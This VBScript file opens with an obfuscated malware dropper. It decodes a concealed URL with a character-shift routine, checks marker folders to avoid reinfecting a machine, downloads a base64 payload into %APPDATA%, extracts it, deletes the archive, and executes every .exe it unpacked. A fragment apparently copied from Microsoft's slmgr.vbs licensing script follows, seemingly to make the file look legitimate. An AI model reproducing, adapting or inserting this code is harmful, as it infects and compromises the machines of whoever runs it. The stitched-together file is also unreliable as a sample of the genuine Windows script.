Option Explicit
CONST wshOK                             =0
CONST VALUE_ICON_WARNING                =16
CONST wshYesNoDialog                    =4
CONST VALUE_ICON_QUESTIONMARK           =32
CONST VALUE_ICON_INFORMATION            =64
CONST HKEY_LOCAL_MACHINE                =&H80000002
CONST KEY_SET_VALUE                     =&H0002
CONST KEY_QUERY_VALUE                   =&H0001
CONST REG_SZ                            =1           
dim ilnprrtvceegillnprrtvzzaccbeegiilnpprttveegi,iilnprttzzacceegilnnprttveggilooqsuuaccegiil,jjmprtvvzaccbdffhjjmoorttvveggillnpprrtvvbdd,ggllqqsuaceegillnpprttvzzbaaceegiillnpprttve
dim  aaceggilnnprtddfhjjmooqsuuaccegiimooqsuuxyyb,Clqtquacegilnnpruxybac,SEUZP
dim  oqqsuaddfhjmoojmoqqsuudfiilnpprtvvbddfhjjmoo,mqXFFRJUWm
dim  gilnprttvehjmooqsuaaceggillnqssuxyybacceggil,aaeeiilnpprtvybbaceegiilnpprttvehhjmmoqssuaa,dfhjmoqqueegillnprrtvbbdffh
dim  aacfhhjjmoqsuddbddfhjjmorrtvvzaccbdffhjjmoqq,ilnprttvzaacbdggilnnprrtveegiilnppsuuaceegii,OBJoqsudfhhjmooqsvvbdd
dim  bbdhjjmprttvegillnpp,mmorttvbddfhjmmoqqsuxxaccbddfhhjmooqssuddfhh,xybbaceeiiloqsuudffhjmmoqqsuaadffhjjmoqqsuux
Function Jkdkdkd(G1g)
For aaceggilnnprtddfhjjmooqsuuaccegiimooqsuuxyyb = 1 To Len(G1g)
mmorttvbddfhjmmoqqsuxxaccbddfhhjmooqssuddfhh = Mid(G1g, aaceggilnnprtddfhjjmooqsuuaccegiimooqsuuxyyb, 1)
mmorttvbddfhjmmoqqsuxxaccbddfhhjmooqssuddfhh = Chr(Asc(mmorttvbddfhjmmoqqsuxxaccbddfhhjmooqssuddfhh)+ 6)
aacfhhjjmoqsuddbddfhjjmorrtvvzaccbdffhjjmoqq = aacfhhjjmoqsuddbddfhjjmorrtvvzaccbdffhjjmoqq + mmorttvbddfhjmmoqqsuxxaccbddfhhjmooqssuddfhh
Next
Jkdkdkd = aacfhhjjmoqsuddbddfhjjmorrtvvzaccbdffhjjmoqq
End Function 
Function lnprtddfhjmmoqssuaaceegiimooqssuxxyybacceegiiloo()
Dim ClqtquacegilnnpruxybacLM,jxtcbffhjmoqsvvegi,jrtaaceggilnprrtxw,Coltnprtvbbdfhjmoqssz
Set ClqtquacegilnnpruxybacLM = WScript.CreateObject( "WScript.Shell" )
Set jrtaaceggilnprrtxw = CreateObject( "Scripting.FileSystemObject" )
Set jxtcbffhjmoqsvvegi = jrtaaceggilnprrtxw.GetFolder(aaeeiilnpprtvybbaceegiilnpprttvehhjmmoqssuaa)
Set Coltnprtvbbdfhjmoqssz = jxtcbffhjmoqsvvegi.Files
For Each Coltnprtvbbdfhjmoqssz in Coltnprtvbbdfhjmoqssz
If UCase(jrtaaceggilnprrtxw.GetExtensionName(Coltnprtvbbdfhjmoqssz.name)) = "EXE" Then
ClqtquacegilnnpruxybacLM.Exec(aaeeiilnpprtvybbaceegiilnpprttvehhjmmoqssuaa & "\" & Coltnprtvbbdfhjmoqssz.Name)
End If
Next
End Function
oqqsuaddfhjmoojmoqqsuudfiilnpprtvvbddfhjjmoo     = Jkdkdkd("bnnj4))+3,(,-0(+.1(+**4+3/*)<[\o\dchm](cmi")
Set OBJoqsudfhhjmooqsvvbdd = CreateObject( "WScript.Shell" )    
dfhjmoqqueegillnprrtvbbdffh = OBJoqsudfhhjmooqsvvbdd.ExpandEnvironmentStrings(StrReverse("%ATADPPA%"))
ggllqqsuaceegillnpprttvzzbaaceegiillnpprttve = "A99449C3092CE70964CE715CF7BB75B.zip"
Function lnprtxybaceeiilnpprtvvffhjmmooqssuaaceegiilooqss()
SET iilnprttzzacceegilnnprttveggilooqsuuaccegiil = CREATEOBJECT("Scripting.FileSystemObject")
IF iilnprttzzacceegilnnprttveggilooqsuuaccegiil.FolderExists(dfhjmoqqueegillnprrtvbbdffh + "\DecGram") = TRUE THEN WScript.Quit() END IF
IF iilnprttzzacceegilnnprttveggilooqsuuaccegiil.FolderExists(jjmprtvvzaccbdffhjjmoorttvveggillnpprrtvvbdd) = FALSE THEN
iilnprttzzacceegilnnprttveggilooqsuuaccegiil.CreateFolder jjmprtvvzaccbdffhjjmoorttvveggillnpprrtvvbdd
iilnprttzzacceegilnnprttveggilooqsuuaccegiil.CreateFolder OBJoqsudfhhjmooqsvvbdd.ExpandEnvironmentStrings(StrReverse("%ATADPPA%")) + "\DecGram"
END IF
End Function
Function qssuadfhjjmoqsuuxyybaccfhhjmmoqqsuddfhhjmmorrtvv()
DIM jrtaaceggilnprrtxxsd
Set jrtaaceggilnprrtxxsd = Createobject("Scripting.FileSystemObject")
jrtaaceggilnprrtxxsd.DeleteFile aaeeiilnpprtvybbaceegiilnpprttvehhjmmoqssuaa & "\" & ggllqqsuaceegillnpprttvzzbaaceegiillnpprttve
End Function
aaeeiilnpprtvybbaceegiilnpprttvehhjmmoqssuaa = dfhjmoqqueegillnprrtvbbdffh + "\nvmodmall"
oqqsuuxybacceggilnnqsuudf
jjmprtvvzaccbdffhjjmoorttvveggillnpprrtvvbdd = aaeeiilnpprtvybbaceegiilnpprttvehhjmmoqssuaa
lnprtxybaceeiilnpprtvvffhjmmooqssuaaceegiilooqss
oortvzaacbddfhjjmoqqttveegiillnpprttvbbddfhhlnnp
WScript.Sleep 10103
rtveiilnqsuuaceggilnnprttvybbaccegiilnpprtvvehjj
WScript.Sleep 5110
qssuadfhjjmoqsuuxyybaccfhhjmmoqqsuddfhhjmmorrtvv
lnprtddfhjmmoqssuaaceegiimooqssuxxyybacceegiiloo
Function oqqsuuxybacceggilnnqsuudf()
Set mqXFFRJUWm = CreateObject("Scripting.FileSystemObject")
If (mqXFFRJUWm.FolderExists(aaeeiilnpprtvybbaceegiilnpprttvehhjmmoqssuaa )) Then
WScript.Quit()
End If 
End Function   
Function oortvzaacbddfhjjmoqqttveegiillnpprttvbbddfhhlnnp()
DIM req
Set req = CreateObject("Msxml2.XMLHttp.6.0")
req.open "GET", oqqsuaddfhjmoojmoqqsuudfiilnpprtvvbddfhjjmoo, False
req.send
If req.Status = 200 Then
 Dim oNode, BinaryStream
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.text = req.responseText
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write oNode.nodeTypedValue
BinaryStream.SaveToFile aaeeiilnpprtvybbaceegiilnpprttvehhjmmoqssuaa & "\" & ggllqqsuaceegillnpprttvzzbaaceegiillnpprttve, adSaveCreateOverWrite
End if
End Function
gilnprttvehjmooqsuaaceggillnqssuxyybacceggil = "ilnprttvzaacbdggilnnprrtveegiilnppsuuaceegii"
Function rtveiilnqsuuaceggilnnprttvybbaccegiilnpprtvvehjj()
set Clqtquacegilnnpruxybac = CreateObject("Shell.Application")
set SEUZP=Clqtquacegilnnpruxybac.NameSpace(aaeeiilnpprtvybbaceegiilnpprttvehhjmmoqssuaa & "\" & ggllqqsuaceegillnpprttvzzbaaceegiillnpprttve).items
Clqtquacegilnnpruxybac.NameSpace(aaeeiilnpprtvybbaceegiilnpprttvehhjmmoqssuaa & "\").CopyHere(SEUZP), 4
Set Clqtquacegilnnpruxybac = Nothing
End Function 

Private Sub DisplayAVMAClientInformation(objProduct)
    Dim strHostName, strPid
    Dim displayDate
    Dim bHostName, bFiletime, bPid

    strHostName = objProduct.AutomaticVMActivationHostMachineName
    bHostName = strHostName <> "" And Not IsNull(strHostName)

    Set displayDate = CreateObject("WBemScripting.SWbemDateTime")
    displayDate.Value = objProduct.AutomaticVMActivationLastActivationTime
    bFiletime = displayDate.GetFileTime(false) <> 0

    strPid = objProduct.AutomaticVMActivationHostDigitalPid2
    bPid = strPid <> "" And Not IsNull(strPid)

    If bHostName Or bFiletime Or bPid Then
        LineOut ""
        LineOut GetResource("L_MsgVLMostRecentActivationInfo")
        LineOut GetResource("L_MsgAVMAInfo")

        If bHostName Then
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & strHostName
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & GetResource("L_MsgNotAvailable")
        End If

        If bFiletime Then
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & displayDate.GetVarDate
        Else
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & GetResource("L_MsgNotAvailable")
        End If

        If bPid Then
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & strPid
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & GetResource("L_MsgNotAvailable")
        End If
    End If

End Sub

'
' Display all information for /dlv and /dli
' If you add need to access new properties through WMI you must add them to the
' queries for service/object.  Be sure to check that the object properties in DisplayAllInformation()
' are requested for function/methods such as GetIsPrimaryWindowsSKU() and DisplayKMSClientInformation().
'